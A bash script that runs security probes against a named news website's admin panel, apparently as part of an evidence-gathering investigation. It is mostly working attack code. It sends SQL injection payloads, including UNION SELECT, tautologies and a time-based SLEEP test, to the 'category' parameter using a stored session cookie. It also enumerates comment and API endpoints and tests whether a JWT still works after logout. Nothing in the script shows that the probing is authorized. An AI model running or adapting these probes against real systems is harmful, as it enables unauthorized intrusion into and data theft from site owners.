#!/usr/bin/env bash
TARGET="https://www.thedownundernews.online"
JAR=/home/research/Projects/DownUnderNewsz/evidence/phase2/jar_writer.txt
EV=/home/research/Projects/DownUnderNewsz/evidence/phase3
OUT=$EV/misc-tests.out
: > "$OUT"

echo "=== 1 SQLi probes on category param ===" | tee -a "$OUT"
for q in "1" "1 OR 1=1" "1 UNION SELECT NULL--" "1'" "0'OR'1'='1" "9999999" "0"; do
  printf '\n--- q=[%s] ---\n' "$q" | tee -a "$OUT"
  curl -sS -k -b "$JAR" -w "status=%{http_code} size=%{size_download} time=%{time_total}\n" -o /tmp/sqli.$$ -m 20 -G --data-urlencode "category=$q" "$TARGET/admin/articles" | tee -a "$OUT"
  echo "--- body first 300B ---" | tee -a "$OUT"
  head -c 300 /tmp/sqli.$$ | tee -a "$OUT"
  echo | tee -a "$OUT"
done

echo | tee -a "$OUT"
echo "=== 1b sleep test ===" | tee -a "$OUT"
curl -sS -k -b "$JAR" -w "SLEEP_RESULT status=%{http_code} time=%{time_total}\n" -o /dev/null -m 15 -G --data-urlencode "category=1' AND SLEEP(5)-- -" "$TARGET/admin/articles" | tee -a "$OUT"

echo | tee -a "$OUT"
echo "=== 2 Comments probe ===" | tee -a "$OUT"
for ep in /api/comments /api/articles/5/comments /api/articles/5 /article/welcome-to-the-down-under-news; do
  printf '\n--- %s ---\n' "$ep" | tee -a "$OUT"
  curl -sS -k -w "status=%{http_code} size=%{size_download}\n" -m 10 "$TARGET$ep" -o /tmp/c.$$
  stat --format="file=/tmp/c.$$ size=%s" /tmp/c.$$ 2>/dev/null
  grep -oE 'comment|<form|<textarea|<input' /tmp/c.$$ | sort -u | head -n 20 | tee -a "$OUT"
done

echo | tee -a "$OUT"
echo "=== 3 Session invalidation ===" | tee -a "$OUT"
echo "-- pre-logout profile GET --" | tee -a "$OUT"
curl -sS -k -b "$JAR" -w "\nstatus=%{http_code}\n" -m 10 "$TARGET/admin/profile" | head -c 200 | tee -a "$OUT"
echo | tee -a "$OUT"

echo "-- logout --" | tee -a "$OUT"
curl -sS -k -b "$JAR" -D "$EV/logout-headers.txt" -o /tmp/logout.$$ -w "\nstatus=%{http_code}\n" -m 10 "$TARGET/admin/logout" | tee -a "$OUT"
echo "-- logout headers --" | tee -a "$OUT"
cat "$EV/logout-headers.txt" | tee -a "$OUT"
echo "-- logout body (300B) --" | tee -a "$OUT"
head -c 300 /tmp/logout.$$ | tee -a "$OUT"
echo | tee -a "$OUT"

echo "-- reuse original JWT after logout --" | tee -a "$OUT"
curl -sS -k -b "$JAR" -w "\nstatus=%{http_code}\n" -m 10 "$TARGET/admin/profile" | head -c 200 | tee -a "$OUT"
echo | tee -a "$OUT"

echo DONE | tee -a "$OUT"
rm -f /tmp/sqli.$$ /tmp/c.$$ /tmp/logout.$$
